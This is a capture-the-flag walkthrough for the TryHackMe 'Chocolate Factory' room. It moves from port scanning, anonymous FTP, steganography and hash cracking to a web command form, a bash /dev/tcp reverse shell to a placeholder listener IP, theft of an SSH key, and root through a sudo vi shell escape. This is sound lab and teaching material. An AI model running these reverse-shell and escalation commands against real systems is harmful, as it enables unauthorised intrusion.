# Chocolate Factory

Room: https://tryhackme.com/room/chocolatefactory

A Charlie And The Chocolate Factory themed room, revisit Willy Wonka's chocolate factory!

⚠️ STOP

Stuck and need a nudge in the right direction?

➡️ Try the hints page before reading the full solution: https://github.com/garthheff/CTF-Hints/blob/main/chocolatefactory.md

## Overview

The path we took was:

1. Full TCP scan found FTP, SSH, HTTP, and many low-numbered TCP listeners.
2. Anonymous FTP exposed `gum_room.jpg`.
3. `steghide` with a blank passphrase extracted `b64.txt`.
4. Decoding `b64.txt` revealed shadow-style hashes, including one for `charlie`.
5. The `charlie` hash cracked with `john`.
6. The website exposed a command execution form on `home.php`.
7. A reverse shell gave us `www-data`.
8. From `www-data`, we read `/home/charlie/teleport`, an SSH private key.
9. The SSH key allowed login as `charlie`.
10. `sudo -l` showed `charlie` could run `/usr/bin/vi` without a password.
11. `vi` shell escape gave root.
12. `/root/root.py` required the key from `/var/www/html/key_rev_key`.

---

## Target setup

```bash
export TARGET=10.67.128.227
```

---

## Enumeration

We started with a full TCP version scan.

```bash
nmap -sV -p- $TARGET
```

Output:

```text
Starting Nmap 7.80 ( https://nmap.org ) at 2026-05-09 08:59 BST
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Stats: 0:01:41 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 10.34% done; ETC: 09:15 (0:14:18 remaining)
Stats: 0:01:47 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 10.34% done; ETC: 09:16 (0:15:10 remaining)
Nmap scan report for 10.67.128.227
Host is up (0.00022s latency).
Not shown: 65506 closed ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.5
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
100/tcp open  newacct?
101/tcp open  hostname?
102/tcp open  iso-tsap?
103/tcp open  gppitnp?
104/tcp open  acr-nema?
105/tcp open  csnet-ns?
106/tcp open  pop3pw?
107/tcp open  rtelnet?
108/tcp open  snagas?
109/tcp open  pop2?
110/tcp open  pop3?
111/tcp open  rpcbind?
112/tcp open  mcidas?
113/tcp open  ident?
114/tcp open  audionews?
115/tcp open  sftp?
116/tcp open  ansanotify?
117/tcp open  uucp-path?
118/tcp open  sqlserv?
119/tcp open  nntp?
120/tcp open  cfdptkt?
121/tcp open  erpc?
122/tcp open  smakynet?
123/tcp open  ntp?
124/tcp open  ansatrader?
125/tcp open  locus-map?
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 347.21 seconds
```

The useful ports were:

| Port | Service | Notes |
| --- | --- | --- |
| 21 | FTP | Anonymous login worked |
| 22 | SSH | Later used for `charlie` |
| 80 | HTTP | Login and command execution |
| 100 to 125 | Custom listeners | Themed hints, including one pointing at `key_rev_key` |

The many low ports mostly returned the chocolate room banner. Later, once we had shell, we confirmed they came from `/etc/init.d/ports.sh`.

---

## Anonymous FTP

FTP allowed anonymous login.

```bash
ftp $TARGET
```

Output:

```text
Connected to 10.67.128.227.
220 (vsFTPd 3.0.5)
Name (10.67.128.227:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 65534    65534        4096 Oct 01  2020 .
drwxr-xr-x    2 65534    65534        4096 Oct 01  2020 ..
-rw-rw-r--    1 1000     1000       208838 Sep 30  2020 gum_room.jpg
226 Directory send OK.
ftp> get gum_room.jpg
local: gum_room.jpg remote: gum_room.jpg
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for gum_room.jpg (208838 bytes).
226 Transfer complete.
208838 bytes received in 0.00 secs (80.2108 MB/s)
```

Check the file type.

```bash
file gum_room.jpg
```

Output:

```text
gum_room.jpg: JPEG image data, Exif standard: [TIFF image data, big-endian, direntries=0], baseline, precision 8, 1920x1080, components 3
```

---

## Steghide extraction

The image contained hidden data. `steghide` worked with a blank passphrase.

```bash
steghide --extract -sf gum_room.jpg
```

Output:

```text
Enter passphrase:
wrote extracted data to "b64.txt".
```

The extracted file was base64 encoded.

```bash
cat b64.txt | base64 -d
```

Output excerpt:

```text
daemon:*:18380:0:99999:7:::
bin:*:18380:0:99999:7:::
sys:*:18380:0:99999:7:::
sync:*:18380:0:99999:7:::
games:*:18380:0:99999:7:::
man:*:18380:0:99999:7:::
lp:*:18380:0:99999:7:::
mail:*:18380:0:99999:7:::
news:*:18380:0:99999:7:::
uucp:*:18380:0:99999:7:::
proxy:*:18380:0:99999:7:::
www-data:*:18380:0:99999:7:::
backup:*:18380:0:99999:7:::
list:*:18380:0:99999:7:::
irc:*:18380:0:99999:7:::
gnats:*:18380:0:99999:7:::
nobody:*:18380:0:99999:7:::
...
charlie:$6$CZJnCPeQWp9/jpNx$REDACTED_HASH/:18535:0:99999:7:::
```

This gave us a shadow-style hash for `charlie`.

---

## Cracking Charlie's hash

Save the hash.

```bash
echo 'charlie:$6$CZJnCPeQWp9/jpNx$REDACTED_HASH/:18535:0:99999:7:::' > hash.txt
```

Then crack with John.

```bash
john --wordlist=rockyou.txt hash.txt
```

Output:

```text
Loaded 1 password hash (crypt, generic crypt(3) [?/64])
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:19 0% 0g/s 6900p/s 6900c/s 6900C/s ruben21..rickrick
0g 0:00:00:22 0% 0g/s 6990p/s 6990c/s 6990C/s ganapati..fredito
0g 0:00:00:24 1% 0g/s 7045p/s 7045c/s 7045C/s Jazmine1..ESTUDIANTE
REDACTED_PASSWORD           (charlie)
1g 0:00:02:11 100% 0.007594g/s 7477p/s 7477c/s 7477C/s coasta..cmylmz
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Important note from our run: this cracked value was useful evidence, but we did **not** end up needing it for SSH. The working SSH login came from the private key found later.

---

## Web enumeration

The web app had a command form on `home.php`.

```text
view-source:http://TARGET/home.php
```

Source:

```html
<html>
<head>
<title></title>
<style type="text/css">
.cmd{
position: absolute;
margin-top: 5%;
margin-left: 40%;
}
body{
background-image: url(home.jpg);
height: 90vh;
background-size: cover;
background-position: center;
}
input[type="text"],select{
padding: 5px;
}
button{
padding: 5px;
}
</style>
</head>
<body>
<div class="cmd">
<form method="POST">
<input id="comm" type="text" name="command" placeholder="Command">
<button>Execute</button>
</form>
</form>
</body>
</html>
```

The important part is:

```html
<input id="comm" type="text" name="command" placeholder="Command">
```

That meant the web page accepted commands server-side.

---

## Reverse shell as www-data

Set a listener on our machine.

```bash
nc -lnvp 4444
```

The shell payload must use the VPN IP, not the AttackBox IP.

```bash
bash -c 'bash -i >& /dev/tcp/YOUR_TUN0_IP/4444 0>&1'
```

Listener output:

```text
Listening on 0.0.0.0 4444
Connection received on 10.67.128.227 41284
bash: cannot set terminal process group (886): Inappropriate ioctl for device
bash: no job control in this shell
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

www-data@ip-10-67-128-227:/var/www/html$
```

Upgrade the shell a little.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Check identity.

```bash
id
```

Output:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data),0(root),27(sudo),108(lxd)
```

Note: `www-data` being in `root`, `sudo`, and `lxd` groups looked weird and interesting, but the path we used did not require LXD.

---

## Finding the SSH key

From the `www-data` shell, we checked `/home/charlie` and found `teleport`.

```bash
cd /home/charlie
ls -la
cat teleport
cat teleport.pub
```

The private key belonged to `charlie`.

```text
-----BEGIN RSA PRIVATE KEY-----
REDACTED_PRIVATE_KEY
-----END RSA PRIVATE KEY-----
```

The public key ended with:

```text
charlie@chocolate-factory
```

Copy the private key to our machine as `teleport`, then lock down permissions.

```bash
chmod 600 teleport
```

If manually copying the key, make sure the header and footer have exactly five dashes:

```text
-----BEGIN RSA PRIVATE KEY-----
-----END RSA PRIVATE KEY-----
```

We hit a local `ssh-keygen` error when the key header/footer was copied incorrectly:

```text
Load key "teleport": error in libcrypto
```

After fixing the formatting, SSH worked.

```bash
ssh -i teleport charlie@$TARGET
```

Output:

```text
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-139-generic x86_64)

System information as of Sat 09 May 2026 09:11:21 AM UTC

System load:  0.0
Processes:             2096
Usage of /:   72.8% of 8.76GB
Users logged in:       0
Memory usage: 40%
IPv4 address for ens5: 10.67.128.227
Swap usage:   0%
```

Now we had a real shell as `charlie`.

---

## User flag

```bash
cd /home/charlie
ls -la
cat user.txt
```

Output:

```text
REDACTED_USER_FLAG
```

---

## Local enumeration as charlie

Check sudo permissions.

```bash
sudo -l
```

Output:

```text
Matching Defaults entries for charlie on ip-10-67-128-227:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User charlie may run the following commands on ip-10-67-128-227:
    (ALL : !root) NOPASSWD: /usr/bin/vi
```

We also checked writable files.

```bash
find / -writable -type f 2>/dev/null | grep -v '/proc' | grep -v '/sys' | head -50
```

Output:

```text
/home/charlie/.profile
/home/charlie/.bashrc
/home/charlie/.cache/motd.legal-displayed
/home/charlie/user.txt
/home/charlie/teleport
/home/charlie/teleport.pub
/var/www/html/validate.php
/var/www/html/image.png
/var/www/html/home.jpg
/var/www/html/index.php.bak
/var/www/html/index.html
/var/www/html/home.php
/var/www/html/key_rev_key
/var/ftp/gum_room.jpg
/etc/init.d/ports.sh
/etc/init.d/chocolate.txt
```

The writable `/etc/init.d/ports.sh` was tempting, and it was indeed running the low-port `nc` listeners as root.

```bash
cat /etc/init.d/ports.sh
```

Output:

```bash
for i in {100..112}
do
cat /etc/init.d/chocolate.txt | nc -lkp $i > /dev/null &
done

echo "http://localhost/key_rev_key <- You will find the key here!!!"|nc -lkp 113 > /dev/null &

for j in {114..125}
do
cat /etc/init.d/chocolate.txt | nc -lkp $j > /dev/null &
done
```

Check the listeners.

```bash
ps aux | grep '[n]c -lkp'
```

Output excerpt:

```text
root         788  0.0  0.0   3260   764 ?        S    07:56   0:00 nc -lkp 100
root         790  0.0  0.0   3260   768 ?        S    07:56   0:00 nc -lkp 101
root         792  0.0  0.0   3260   828 ?        S    07:56   0:00 nc -lkp 102
root         794  0.0  0.0   3260   828 ?        S    07:56   0:00 nc -lkp 103
root         796  0.0  0.0   3260   832 ?        S    07:56   0:00 nc -lkp 104
root         798  0.0  0.0   3260   828 ?        S    07:56   0:00 nc -lkp 105
root         800  0.0  0.0   3260   764 ?        S    07:56   0:00 nc -lkp 106
root         802  0.0  0.0   3260   828 ?        S    07:56   0:00 nc -lkp 107
root         804  0.0  0.0   3260   756 ?        S    07:56   0:00 nc -lkp 108
root         806  0.0  0.0   3260   768 ?        S    07:56   0:00 nc -lkp 109
```

This was interesting, but not needed for root. Restarting the service required authentication, and resetting the THM machine would start from a fresh image, losing any edits. The direct sudo `vi` route was cleaner.

---

## Root via sudo vi

First we confirmed `vi` could be run without a password.

```bash
sudo -n /usr/bin/vi -c ':q'
```

No output meant it ran cleanly.

Then use `vi` shell escape.

```bash
sudo /usr/bin/vi -c ':set shell=/bin/bash' -c ':shell'
```

Check identity.

```bash
whoami
id
```

Output:

```text
root
uid=0(root) gid=0(root) groups=0(root)
```

A shorter alternative is:

```bash
sudo /usr/bin/vi -c ':!/bin/bash'
```

Note: We tested the old sudo `-u#-1` trick because the sudoers line had `(ALL : !root)`, but this box had sudo `1.8.31`, so that bypass did not apply. The simple GTFOBins-style `vi` shell escape worked because the plain command matched the `NOPASSWD` rule.

---

## Root flag and root.py

In `/root`, we found `root.py`.

```bash
cd /root
ls
cat root.py
```

Output:

```python
from cryptography.fernet import Fernet
import pyfiglet
key=input("Enter the key:  ")
f=Fernet(key)
encrypted_mess= 'gAAAAABfdb52eejIlEaE9ttPY8ckMMfHTIw5lamAWMy8yEdGPhnm9_H_yQikhR-bPy09-NVQn8lF_PDXyTo-T7CpmrFfoVRWzlm0OffAsUM7KIO_xbIQkQojwf_unpPAAKyJQDHNvQaJ'
dcrypt_mess=f.decrypt(encrypted_mess)
mess=dcrypt_mess.decode()
display1=pyfiglet.figlet_format("You Are Now The Owner Of ")
display2=pyfiglet.figlet_format("Chocolate Factory ")
print(display1)
print(display2)
print(mess)
```

The script asks for the key found elsewhere. The low-port service and `/etc/init.d/ports.sh` pointed to:

```text
http://localhost/key_rev_key
```

On disk, this was:

```text
/var/www/html/key_rev_key
```

We inspected it with `strings`.

```bash
strings /var/www/html/key_rev_key
```

Output excerpt:

```text
Enter your name:
laksdhfas
 congratulations you have found the key:
b'REDACTED_FERNET_KEY'
```

Run it directly.

```bash
cd /var/www/html
chmod +x key_rev_key
./key_rev_key
```

Output:

```text
Enter your name: laksdhfas

 congratulations you have found the key:   b'REDACTED_FERNET_KEY'
 Keep its safe
```

Use the Fernet key with `root.py`.

```bash
cd /root
python3 root.py
```

When prompted, enter the key value from `key_rev_key`.

```text
Enter the key:
REDACTED_FERNET_KEY
```

Output:

```text
You Are Now The Owner Of
Chocolate Factory
REDACTED_ROOT_FLAG_OR_FINAL_MESSAGE
```
---

## Final command summary

```bash
export TARGET=10.67.128.227
nmap -sV -p- $TARGET
ftp $TARGET
get gum_room.jpg
steghide --extract -sf gum_room.jpg
cat b64.txt | base64 -d
echo 'charlie:$6$CZJnCPeQWp9/jpNx$REDACTED_HASH/:18535:0:99999:7:::' > hash.txt
john --wordlist=rockyou.txt hash.txt
nc -lnvp 4444
```

Web command payload:

```bash
bash -c 'bash -i >& /dev/tcp/YOUR_TUN0_IP/4444 0>&1'
```

Shell upgrade:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

SSH as Charlie:

```bash
chmod 600 teleport
ssh -i teleport charlie@$TARGET
```

Privilege escalation:

```bash
sudo -l
sudo /usr/bin/vi -c ':set shell=/bin/bash' -c ':shell'
whoami
id
```

Find the Fernet key:

```bash
cd /var/www/html
strings key_rev_key
chmod +x key_rev_key
./key_rev_key
```

Run the root script:

```bash
cd /root
python3 root.py
```

---

## Lessons learned

- Always check anonymous FTP properly, including images.
- Try blank passphrases with steghide when the room hints at hidden data.
- A cracked password is useful, but private keys may provide the cleaner path.
- When copying SSH keys, preserve exact formatting.
- For reverse shells from THM targets, use the VPN/tun interface IP.
- `sudo -l` plus GTFOBins is still one of the fastest privilege escalation checks.
- Not every interesting writable root-started script is immediately exploitable if you cannot trigger it as root.
